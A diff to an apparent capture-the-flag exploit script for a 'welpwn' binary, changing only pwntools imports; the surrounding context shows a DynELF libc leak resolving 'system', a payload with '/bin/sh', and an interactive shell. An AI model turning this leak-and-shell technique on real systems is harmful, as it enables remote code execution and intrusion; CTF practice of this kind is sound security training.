@@ -1,8 +1,9 @@
 # from zio import *
 # from zio import *
 from zio import *
-from pwn import dynelf, elf
-import ctypes, string
+from pwnlib.dynelf import *
+from pwnlib.elf import *
+import ctypes
 
 target  = './welpwn_932a4428ea8d4581431502ab7e66ea4b'
 io      = zio(target, print_read = False, print_write = False, timeout = 0x10000)
@@ -55,10 +56,9 @@ def exp(adr_system):
     io.wl(payload)
     io.wl('/bin/sh\x00' + l64(adr_system))
 
-d = dynelf.DynELF(leak, elf = elf.ELF('welpwn_932a4428ea8d4581431502ab7e66ea4b'))
+d = DynELF(leak, elf = ELF('welpwn_932a4428ea8d4581431502ab7e66ea4b'))
 
 adr_system = d.lookup('system', 'libc')
 print '[+] system addr\t:\t' + hex(adr_system)
 exp(adr_system)
 io.itr()
-
